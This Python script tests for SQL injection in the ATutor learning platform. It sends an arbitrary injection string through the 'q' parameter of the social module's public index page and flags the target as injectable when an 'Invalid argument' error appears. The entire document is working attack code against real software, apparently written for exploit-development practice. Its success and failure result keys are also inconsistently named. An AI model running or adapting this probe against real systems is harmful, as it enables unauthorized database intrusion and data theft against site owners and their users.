import re
import requests
import argparse


def searchFriends_sqli(ip, inj_str):
    target = f'http://{ip}/ATutor/mods/_standard/social/index_public.php?q={inj_str}'
    response = requests.get(target)
    result = {}
    error = re.search("Invalid argument", response.text)
    if error:
        result['injectible'] = True
    else:
        result['injection'] = False
    result['header'] = response.headers
    result['text'] = response.text
    return result

def main():
    parser = argparse.ArgumentParser(description='Check for SQL Injection.')
    parser.add_argument('-i', '--ip', type=str, help='ip address or FQDN', required=True)
    parser.add_argument('-s', '--string', type=str, help='injection string', required=True)

    args = parser.parse_args()
    result = searchFriends_sqli(args.ip, args.string)
    print(result)

if __name__=="__main__":
    main()


